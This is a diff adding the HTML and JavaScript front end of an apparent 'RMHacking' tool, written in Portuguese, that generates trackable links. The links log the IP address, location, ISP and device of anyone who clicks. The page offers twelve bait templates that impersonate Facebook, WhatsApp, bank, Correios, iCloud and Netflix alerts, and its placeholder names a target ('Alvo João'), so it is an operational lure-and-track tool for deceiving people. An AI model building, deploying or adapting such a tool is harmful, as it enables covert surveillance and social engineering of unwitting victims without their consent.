@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Rastreador de Links — RMHacking</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#0f0f1a;color:#e2e8f0;min-height:100vh;display:flex}
+.sidebar{width:220px;min-height:100vh;background:#13131f;border-right:1px solid rgba(255,255,255,.06);display:flex;flex-direction:column;position:fixed;top:0;left:0;bottom:0;z-index:100}
+.sidebar-logo{padding:20px 16px 16px;border-bottom:1px solid rgba(255,255,255,.06)}
+.sidebar-logo h1{font-size:18px;font-weight:700;color:#a5b4fc}
+.sidebar-logo p{font-size:11px;color:#6b7280;margin-top:2px;text-transform:uppercase;letter-spacing:.05em}
+.sidebar-nav{padding:12px 8px;flex:1}
+.nav-item{display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:8px;color:#9ca3af;font-size:13px;font-weight:500;text-decoration:none;transition:all .15s;cursor:pointer;margin-bottom:2px}
+.nav-item:hover{background:rgba(165,180,252,.08);color:#e2e8f0}
+.nav-item.active{background:rgba(165,180,252,.12);color:#a5b4fc}
+.sidebar-footer{padding:16px;border-top:1px solid rgba(255,255,255,.06)}
+.main{margin-left:220px;flex:1;padding:28px}
+.page-header{margin-bottom:28px}
+.page-header h2{font-size:22px;font-weight:700;color:#f1f5f9;display:flex;align-items:center;gap:10px}
+.page-header p{font-size:13px;color:#6b7280;margin-top:4px}
+
+/* Cards */
+.card{background:#13131f;border:1px solid rgba(255,255,255,.07);border-radius:14px;padding:22px;margin-bottom:20px}
+.card h3{font-size:14px;font-weight:700;color:#a5b4fc;margin-bottom:16px;display:flex;align-items:center;gap:8px}
+
+/* Form */
+.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.form-group{display:flex;flex-direction:column;gap:6px}
+.form-group label{font-size:11px;font-weight:600;color:#9ca3af;text-transform:uppercase;letter-spacing:.05em}
+.form-group input,.form-group select,.form-group textarea{background:#0f0f1a;border:1px solid rgba(255,255,255,.1);border-radius:8px;padding:9px 12px;color:#f1f5f9;font-size:13px;outline:none;transition:border-color .15s;font-family:inherit}
+.form-group input:focus,.form-group select:focus{border-color:#4f46e5}
+.form-group select option{background:#1a1a2e}
+
+/* Presets */
+.presets{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px;margin-bottom:16px}
+.preset-btn{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);border-radius:10px;padding:12px 10px;cursor:pointer;transition:all .2s;text-align:center}
+.preset-btn:hover{border-color:rgba(79,70,229,.4);background:rgba(79,70,229,.08)}
+.preset-btn .icon{font-size:22px;margin-bottom:4px}
+.preset-btn .name{font-size:11px;font-weight:600;color:#c7d2fe}
+.preset-btn .desc{font-size:10px;color:#4b5563;margin-top:2px}
+
+/* Buttons */
+.btn{padding:9px 18px;border-radius:8px;border:none;font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;display:inline-flex;align-items:center;gap:6px}
+.btn-primary{background:linear-gradient(135deg,#4f46e5,#7c3aed);color:#fff}
+.btn-primary:hover{opacity:.9}
+.btn-danger{background:rgba(239,68,68,.1);color:#f87171;border:1px solid rgba(239,68,68,.2)}
+.btn-danger:hover{background:rgba(239,68,68,.2)}
+.btn-copy{background:rgba(16,185,129,.1);color:#34d399;border:1px solid rgba(16,185,129,.2);font-size:12px;padding:5px 10px}
+.btn-copy:hover{background:rgba(16,185,129,.2)}
+
+/* Link list */
+.link-card{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.07);border-radius:12px;padding:16px;margin-bottom:12px}
+.link-card-header{display:flex;align-items:flex-start;justify-content:space-between;gap:12px;margin-bottom:10px}
+.link-title{font-size:14px;font-weight:600;color:#f1f5f9}
+.link-meta{font-size:11px;color:#6b7280;margin-top:2px}
+.link-url{font-size:12px;color:#4f46e5;font-family:monospace;background:rgba(79,70,229,.08);border:1px solid rgba(79,70,229,.15);border-radius:6px;padding:6px 10px;word-break:break-all;margin-bottom:10px;display:flex;align-items:center;justify-content:space-between;gap:8px}
+.clicks-count{display:flex;align-items:center;gap:6px;font-size:12px;color:#9ca3af}
+.clicks-count .num{font-size:20px;font-weight:700;color:#4f46e5}
+
+/* Clique details */
+.click-row{display:flex;gap:10px;padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.04);font-size:12px;flex-wrap:wrap;align-items:center}
+.click-row:last-child{border-bottom:none}
+.click-ip{font-family:monospace;color:#a5b4fc;font-weight:600;min-width:120px}
+.click-loc{color:#e2e8f0}
+.click-time{color:#4b5563;margin-left:auto;white-space:nowrap}
+.click-ua{color:#4b5563;font-size:10px;width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+
+/* Badge */
+.badge{font-size:10px;padding:2px 8px;border-radius:10px;font-weight:600}
+.badge-live{background:rgba(16,185,129,.15);color:#34d399;border:1px solid rgba(16,185,129,.2)}
+.badge-zero{background:rgba(107,114,128,.1);color:#6b7280;border:1px solid rgba(107,114,128,.2)}
+
+/* Toast */
+.toast{position:fixed;bottom:24px;right:24px;background:#1e1e2e;border:1px solid rgba(79,70,229,.4);border-radius:10px;padding:12px 18px;color:#c7d2fe;font-size:13px;z-index:999;transform:translateY(80px);opacity:0;transition:all .3s}
+.toast.show{transform:translateY(0);opacity:1}
+
+/* Empty */
+.empty{text-align:center;padding:40px 20px;color:#374151}
+.empty .icon{font-size:40px;margin-bottom:12px}
+.empty p{font-size:13px}
+
+.section-label{font-size:11px;font-weight:700;color:#6b7280;text-transform:uppercase;letter-spacing:.08em;margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid rgba(255,255,255,.05)}
+</style>
+</head>
+<body>
+
+<aside class="sidebar">
+  <div class="sidebar-logo">
+    <h1>🔍 RMHacking</h1>
+    <p>Investigação Digital</p>
+  </div>
+  <nav class="sidebar-nav">
+    <a class="nav-item" href="/">📋 Dashboard</a>
+    <a class="nav-item" href="/ferramentas.html">🛠️ Ferramentas</a>
+    <a class="nav-item active" href="/rastreador.html">🎣 Rastreador</a>
+  </nav>
+  <div class="sidebar-footer" style="font-size:12px;color:#4b5563">
+    <a href="#" onclick="logout()" style="color:#6b7280;text-decoration:none">⬅ Sair</a>
+  </div>
+</aside>
+
+<main class="main">
+  <div class="page-header">
+    <h2>🎣 Rastreador de Links</h2>
+    <p>Crie links rastreáveis e capture IP, localização e dispositivo de quem clicar</p>
+  </div>
+
+  <!-- Criar novo link -->
+  <div class="card">
+    <h3>➕ Criar Link Rastreável</h3>
+
+    <div class="section-label">Templates de isca (clique para preencher)</div>
+    <div class="presets" id="presetsGrid"></div>
+
+    <div class="form-grid" style="margin-bottom:14px">
+      <div class="form-group" style="grid-column:1/-1">
+        <label>Título / Identificação</label>
+        <input type="text" id="newTitle" placeholder="Ex: Isca Facebook — Alvo João">
+      </div>
+      <div class="form-group" style="grid-column:1/-1">
+        <label>URL de destino (onde a pessoa vai parar após clicar)</label>
+        <input type="url" id="newTarget" placeholder="https://facebook.com ou qualquer URL">
+      </div>
+      <div class="form-group">
+        <label>Vincular à investigação (opcional)</label>
+        <select id="newInv">
+          <option value="">— Nenhuma —</option>
+        </select>
+      </div>
+    </div>
+    <button class="btn btn-primary" onclick="createLink()">🎣 Gerar Link Rastreável</button>
+  </div>
+
+  <!-- Links criados -->
+  <div class="card">
+    <h3>📋 Meus Links <span id="totalLinks" style="font-size:12px;color:#6b7280;font-weight:400"></span></h3>
+    <div id="linksList"></div>
+  </div>
+</main>
+
+<div class="toast" id="toast"></div>
+
+<script>
+function toast(msg,d=3000){const el=document.getElementById('toast');el.textContent=msg;el.classList.add('show');setTimeout(()=>el.classList.remove('show'),d)}
+
+const PRESETS = [
+  {icon:'📘',name:'Facebook',desc:'Alerta de segurança',url:'https://www.facebook.com',title:'Alerta de Segurança — Facebook'},
+  {icon:'📸',name:'Instagram',desc:'Foto marcada em você',url:'https://www.instagram.com',title:'Você foi marcado em uma foto'},
+  {icon:'💬',name:'WhatsApp',desc:'Mensagem de voz',url:'https://web.whatsapp.com',title:'Mensagem de voz recebida'},
+  {icon:'🎵',name:'TikTok',desc:'Seu vídeo viralizou',url:'https://www.tiktok.com',title:'Seu vídeo atingiu 10k views'},
+  {icon:'🐦',name:'X/Twitter',desc:'Menção viral',url:'https://x.com',title:'Você foi mencionado em post viral'},
+  {icon:'📦',name:'Correios',desc:'Pacote retido',url:'https://www.correios.com.br',title:'Seu pacote está retido — Ação necessária'},
+  {icon:'🏦',name:'Banco',desc:'Transação suspeita',url:'https://www.google.com',title:'Transação suspeita detectada na sua conta'},
+  {icon:'🍎',name:'iCloud',desc:'Login desconhecido',url:'https://icloud.com',title:'Novo login detectado — Apple ID'},
+  {icon:'📧',name:'Gmail',desc:'Verificação de conta',url:'https://mail.google.com',title:'Verificação de segurança — Google'},
+  {icon:'🎮',name:'Steam',desc:'Presente recebido',url:'https://store.steampowered.com',title:'Você recebeu um presente na Steam'},
+  {icon:'📺',name:'Netflix',desc:'Conta suspensa',url:'https://www.netflix.com',title:'Sua conta Netflix foi suspensa'},
+  {icon:'🛒',name:'Mercado Livre',desc:'Venda realizada',url:'https://www.mercadolivre.com.br',title:'Você tem uma nova venda!'},
+];
+
+function renderPresets() {
+  document.getElementById('presetsGrid').innerHTML = PRESETS.map((p,i) => `
+    <div class="preset-btn" onclick="usePreset(${i})">
+      <div class="icon">${p.icon}</div>
+      <div class="name">${p.name}</div>
+      <div class="desc">${p.desc}</div>
+    </div>`).join('');
+}
+
+function usePreset(i) {
+  const p = PRESETS[i];
+  document.getElementById('newTitle').value = p.title;
+  document.getElementById('newTarget').value = p.url;
+  document.getElementById('newTitle').focus();
+  toast('✅ Template aplicado — edite se quiser e clique em Gerar');
+}
+
+async function createLink() {
+  const title = document.getElementById('newTitle').value.trim();
+  const target_url = document.getElementById('newTarget').value.trim();
+  const inv_id = document.getElementById('newInv').value;
+  if (!target_url) { toast('⚠️ Informe a URL de destino'); return; }
+  try {
+    const r = await fetch('/api/tracker', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ title, target_url, inv_id: inv_id||null })
+    });
+    const d = await r.json();
+    if (d.error) { toast('❌ '+d.error); return; }
+    // Copia link automaticamente
+    navigator.clipboard.writeText(d.track_url).catch(()=>{});
+    toast('✅ Link criado e copiado: '+d.track_url);
+    document.getElementById('newTitle').value = '';
+    document.getElementById('newTarget').value = '';
+    await loadLinks();
+  } catch(e) { toast('❌ Erro: '+e.message); }
+}
+
+async function loadLinks() {
+  try {
+    const r = await fetch('/api/tracker');
+    if (r.status===401) { window.location.href='/login'; return; }
+    const links = await r.json();
+    document.getElementById('totalLinks').textContent = `(${links.length} link${links.length!==1?'s':''})`;
+    const el = document.getElementById('linksList');
+    if (!links.length) {
+      el.innerHTML = '<div class="empty"><div class="icon">🎣</div><p>Nenhum link criado ainda.<br>Use os templates acima para começar.</p></div>';
+      return;
+    }
+    el.innerHTML = links.map(l => {
+      const clicks = l.clicks||[];
+      const hasClicks = clicks.length > 0;
+      return `
+      <div class="link-card" id="lc-${l.id}">
+        <div class="link-card-header">
+          <div>
+            <div class="link-title">${esc(l.title||'Link rastreável')}</div>
+            <div class="link-meta">Criado em ${(l.created_at||'').substring(0,16)} • Destino: ${esc(l.target_url)}</div>
+          </div>
+          <div style="display:flex;gap:6px;flex-shrink:0">
+            <span class="badge ${hasClicks?'badge-live':'badge-zero'}">${hasClicks?clicks.length+' clique'+(clicks.length>1?'s':''):'Aguardando'}</span>
+            <button class="btn btn-danger" style="padding:4px 10px;font-size:11px" onclick="deleteLink('${l.id}')">🗑</button>
+          </div>
+        </div>
+        <div class="link-url">
+          <span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(l.track_url)}</span>
+          <button class="btn btn-copy" onclick="copyLink('${esc(l.track_url)}')">📋 Copiar</button>
+        </div>
+        ${hasClicks ? `
+        <div style="margin-top:4px">
+          <div style="font-size:11px;font-weight:600;color:#9ca3af;text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px">📍 Cliques registrados</div>
+          <div style="background:#0f0f1a;border:1px solid rgba(255,255,255,.06);border-radius:8px;overflow:hidden;max-height:220px;overflow-y:auto">
+            ${clicks.slice().reverse().map(c => `
+            <div class="click-row">
+              <span class="click-ip">${esc(c.ip)}</span>
+              <span class="click-loc">🌍 ${esc(c.city||'?')}, ${esc(c.region||'?')} (${esc(c.country||'?')})</span>
+              <span style="font-size:11px;color:#6b7280">🏢 ${esc(c.org||'?')}</span>
+              <span class="click-time">${(c.at||'').substring(0,16)}</span>
+              <span class="click-ua">${esc(c.ua||'')}</span>
+            </div>`).join('')}
+          </div>
+        </div>` : ''}
+      </div>`;
+    }).join('');
+  } catch(e) { console.error(e); }
+}
+
+function copyLink(url) {
+  navigator.clipboard.writeText(url).then(()=>toast('✅ Link copiado!')).catch(()=>{
+    prompt('Copie o link:', url);
+  });
+}
+
+async function deleteLink(id) {
+  if (!confirm('Deletar este link rastreável e todos os cliques?')) return;
+  await fetch('/api/tracker/'+id, {method:'DELETE'});
+  toast('🗑 Link deletado');
+  await loadLinks();
+}
+
+function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+
+async function loadInvestigations() {
+  try {
+    const r = await fetch('/api/investigations');
+    if (!r.ok) return;
+    const invs = await r.json();
+    const sel = document.getElementById('newInv');
+    invs.forEach(inv => {
+      const o = document.createElement('option');
+      o.value = inv.id; o.textContent = '#'+inv.id+' — '+inv.title;
+      sel.appendChild(o);
+    });
+  } catch(e) {}
+}
+
+async function logout() {
+  await fetch('/api/logout',{method:'POST'});
+  window.location.href='/login';
+}
+
+renderPresets();
+loadLinks();
+loadInvestigations();
+// Atualiza cliques a cada 15s automaticamente
+setInterval(loadLinks, 15000);
+</script>
+</body>
+</html>
